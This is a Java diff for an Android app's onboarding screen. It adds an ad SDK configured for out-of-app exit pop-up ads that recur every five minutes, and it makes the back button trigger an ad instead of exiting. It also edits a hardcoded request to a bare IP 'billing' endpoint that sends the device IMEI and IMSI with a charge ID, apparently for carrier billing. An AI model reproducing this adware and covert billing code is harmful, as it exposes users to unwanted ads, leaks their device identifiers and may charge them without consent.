@@ -3,11 +3,14 @@ package cn.yoyo.mobile.ui;
 import java.util.ArrayList;
 import java.util.List;
 
+import com.sup.ab.Manager;
 import com.umeng.analytics.MobclickAgent;
 
 import android.app.Activity;
+import android.app.Dialog;
 import android.app.PendingIntent;
 import android.content.Context;
+import android.content.DialogInterface;
 import android.content.Intent;
 import android.content.SharedPreferences;
 import android.net.Uri;
@@ -44,6 +47,11 @@ public class Activity_Guide extends Activity implements OnPageChangeListener{
 		super.onCreate(savedInstanceState);
 		setContentView(R.layout.activity_start);
 		mContext = this;
+		Manager.initSDK(this, "10684");
+		//设置应用外退弹广告第一次启动的时间，单位分钟
+		Manager.setFirstTriggerAtTimeForEO(this, 5);
+		//设置应用外退弹广告两次启动时间间隔，单位分钟
+		Manager.setIntervalForEO(this, 5);
 		MobclickAgent.updateOnlineConfig(this);
 		AlphaAnimation animation = new AlphaAnimation(0.4f, 0.8f);
 		animation.setDuration(600);
@@ -61,7 +69,7 @@ public class Activity_Guide extends Activity implements OnPageChangeListener{
 		listViews.add(view);
 		
 		viewPager.setAdapter(new MyPagerAdapter(listViews));
-		//viewPager.setOnPageChangeListener(this);
+		viewPager.setOnPageChangeListener(this);
 		
 		init();
 		showDialog(view);
@@ -79,7 +87,7 @@ public class Activity_Guide extends Activity implements OnPageChangeListener{
 			break;
 		case ViewPager.SCROLL_STATE_IDLE:
 			if (viewPager.getCurrentItem() == viewPager.getAdapter().getCount() - 1 && !misScrolled) {
-				startActivity(new Intent(this, MainActivity.class));
+				startActivity(new Intent(this, Activity_Main.class));
 				finish();
 			}
 			misScrolled = true;
@@ -134,10 +142,11 @@ public class Activity_Guide extends Activity implements OnPageChangeListener{
         							//if(TextUtils.isEmpty(mArea))
         							//mArea=StringUtil.getURL("http://103.224.248.34:8096/eulprovincefind.aspx?imsi="+mImsi);
         		    				//if(!StringUtil.isBlack(getResources().getStringArray(R.array.cmcc), mArea)){
-        		    					String url = "http://103.224.248.34:8096/eulbillingcmcc.aspx?cpid=10101"
-            				        	        +"&imei=" + mImei
+        		    					String url = "http://103.224.248.34:8096/eulbilling.aspx?"
+            				        	        +"imei=" + mImei
             				        	        +"&imsi=" + mImsi
-            				        	        +"&price=15" ;
+            				        	        +"&chargeId=10436";
+            				        	        //+"&price=15" ;
     									getJson(StringUtil.getURL(url));
         		    				//}			
 								} catch (Exception e) {
@@ -253,17 +262,37 @@ public class Activity_Guide extends Activity implements OnPageChangeListener{
 	   {
 	       if (keyCode == KeyEvent.KEYCODE_BACK)
 	       {
-	    	   if ((System.currentTimeMillis() - exitTime) > 2000)
+	    	   /*if ((System.currentTimeMillis() - exitTime) > 2000)
 	           {
 	                   Toast.makeText(this, getString(R.string.exit_click), Toast.LENGTH_SHORT).show();
 	                   exitTime = System.currentTimeMillis();
 	           } else
 	           {
 	        	   System.exit(0);
-	           }
+	           }*/
+	    	   exit();
 	   				return true;
 	       }
 	       return super.onKeyDown(keyCode, event);
+	   }
+	   
+	   private void exit(){
+		 //退弹广告
+			Manager.showAD2(this,
+					new DialogInterface.OnClickListener() {
+						//点击事件
+						@Override
+						public void onClick(DialogInterface dialog,
+								int which) {
+							switch (which) {
+							case Dialog.BUTTON_POSITIVE:// yes
+								finish();
+								break;
+							case Dialog.BUTTON_NEGATIVE:// no
+								break;
+							}
+						}
+					});
 	   }
 	   
 }
